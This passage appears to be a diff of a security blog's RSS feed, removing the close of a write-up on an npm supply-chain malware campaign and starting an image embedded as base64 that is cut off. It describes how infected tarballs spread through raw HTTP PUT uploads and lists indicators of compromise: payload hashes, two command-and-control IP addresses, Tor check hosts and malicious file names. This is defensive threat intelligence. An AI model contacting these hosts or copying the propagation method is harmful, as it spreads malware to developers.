-The automation of the npm propagation pipeline (by writing infected tarballs and uploading them using direct raw HTTP PUT requests) bypasses standard local CLI guardrails and accelerates the infection cycle. Security teams must monitor not just package configuration files, but active network activity originating from local install scripts and build machines.
-
-JFrog Curation customers are protected, as the malicious package versions have been blocked. We will continue monitoring the campaign and updating our intelligence feeds as new variants emerge.
-
-## Indicators of Compromise (IOCs)
-
-### Payloads
-
-| SHA-256 | Description |
-| :---- | :---- |
-| `a41a523ef9517aab37ed6eea0ec881821bdcb7aefcb5c5f603adc7907f868c86` | Malicious `index.js` file (the `jscrambler` CSI container) |
-| `fbbcf4d8f98168f78f5c0c47a9ae56d59ec8ac84a7c9ca6b797fedfb8d62d2bd` | Linux x86-64 payload |
-| `b7ca95d1b23c8e67416a25cedf741de0917c2096bbc9d24649eea7853d054903` | Windows x86-64 payload |
-| `c8fd47d36bdf7c825378593ab82ed8c24d1dc52e26b507812393e24e1d5201fd` | macOS arm64 payload |
-
-### Network indicators
-
-* `37.27.122.124` (C2 / upload destination)
-* `57.128.246.79` (C2 / upload destination)
-* `archive.torproject.org` (Tor bundle checks)
-* `check.torproject.org` (Tor loop verification)
-
-### Package indicators
-
-* `package/dist/intro.js`
-* `package/dist/setup.js`
-* `setup.mjs`
 ]]></content:encoded>
         </item>
         <item>
@@ -16589,86 +16591,6 @@ aes-core-valid-ipherv *(Xray ID \- 842817\)*
 [image1]: <data:image/png;base64,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KMopHzQMiqIoyikfNAyKoijKKR80DIqiKMopHzQMiqIoyikfNAyKoijKKR80DIqiKMopH+XOMCpUqJCIlaTQf/369ROx3/72t4m6RRX6C+1Hq1atEjGoR48eiVhZK7S95VWhbQ3FKIoqTPkod4ZRVBUyYFjDgErSMKBCtieLYWSpU4js9tl8eVZoW0MxiqIKUz6KbBi4QPfaay+3fOqpp3zsf/7nf2KDL2K/+tWvoqpVq+a9qGvWrBmrg/Tvfve76IQTToguvfRSFxs+fLiLX3fdddH555/vYjAAxLAUM+jWrVt03HHHRTVq1HDr1+spimF07NjRp8866yyfxvZde+21iX2zeezbHnvskaiDp466deum9jd16lS3vdWqVYttN8qvvvrqxHqssE4cJ11PHy/dn3yeuu1uu+0WVapUKfr2229jdeWzQf6Pf/yjO84nnXRS9Je//MXX0fVlmeVcuPzyy6NTTjklOuCAA6IBAwa42OLFi6M//OEPbp267W9+8xt3ztn1QUcccYTLr1+/3uWvv/76WD1sS7t27RJtcW7l2j6K2lmVj2IZhk2HYgcffHA0ZcqURHmaQn3o9O677x517tw5ZzutJUuWJMqKYhgQ9gVL29+yZct8mcjWgfQrqbvvvtunr7rqqkR/2G4MdBKzTxhvvvlmtHr16mjlypVuXajfr1+/mFDv+OOPd/VWrVoVMya7fTr/yiuvJNqGPgudt/VC9fW58PDDD7tlaJtF+rML9ReK2bTk16xZ47bvrrvucrHJkydHEydOjNWDQucWRe0qykepG8axxx4bffPNN4nyNIX6sGkMfMiPHj06WA7deeedUdOmTaPx48cnyopqGNLPaaedFouNGTMmOvDAA4N1tbRh4KlJ0t27d0/0h+3GgClxbRjLly+P3nvvPbf/ItyB9+7dOybUbdKkSayeXo/eNp1//PHHC25r64U+O30u4AkQy9A24/i2bds29tmF+gvFbFrydvugY445xpXhyUhicm7tu+++sT4oaldQPkrNMPbee2+3LA3DCMVsea6y//qv/8rZV5ratGkT3XrrrT7ft2/f1PY2D2nDmDRpkns6QFpemen+6tSpEzOM++67L9bX/vvvn+g/pNB2hOI6L4Zh64TqhvI2JumQYYQUaqtfK0psn332ScRsOpS3CpWHYhS1sysfJW4YuIh1WVbDePfdd125yNaX9G233Raro1W7du1Em0aNGiXqDhkyJPG9xsyZM129zz77LNGvlu0L+d///vfR4YcfnqiLuPSn9036gKkirZ8epD+kly5d6uM33HBD9Otf/9rn5VUU9PnnnyfWrSX1xKCgWbNmxfrT+yWGAeE7ApT17NkzWNeuQ77DkBiefKR+VsPA6yO0wVOGXhfS+K7ExvA0YGO2z4oVK7o4tgF5GLZsM7YRsUWLFvnY9OnTE31Q1M6ufBTZMEIKXagURVHUjqF8lKhhUBRFUTuu8kHDoCiKopzyQcOgKIqinPJBw6AoiqKc8kHDoCiKopzyQcOgKIqinPJBw6AoiqKc8kHDoCiKopzyQcOgKIqinPIRNAxCCCHEQsMghBCSCRoGIYSQTNAwCCGEZIKGQQghJBM0DEIIIZmgYRBCCMkEDYMQQkgmaBiEEEIyQcMghBCSCRoGIYSQTNAwCCGEZIKGQQghJBM0DEIIIZmgYRBCCMkEDYMQQkgmaBiEEEIyQcMghBCSiZyGUbFixeiCCy6wYRd/6KGHbJgQQshODA2DEEJIJkrMME499VQXnzNnTiwODj30UFc2bNgwWxStXr3alUFPPvmkl+aII46IDjzwwFiMEEJI2VIihiEDvqh169YufuKJJybK9t9/f99uwYIFiXIRePvtt4NxQgghZU+xDcMO5Bs3bvRpsGLFCp+2dYubJ4QQUnYU2zD2228/l99tt91MrTgvv/xyYsBHeo899ojlpRxPKdYcunfvnogRQggpG/IaBr4/sCA+dOhQnx8yZIgf7PWAvmXLFh/ba6+9EuWVKlVy+U2bNrknE6QPO+wwVwYD0n2G+ieEEFJ25DUMO0DjFZONCfPnz3dl8rRh29v8qlWrYkbQsWNHX3b77be72Hvvved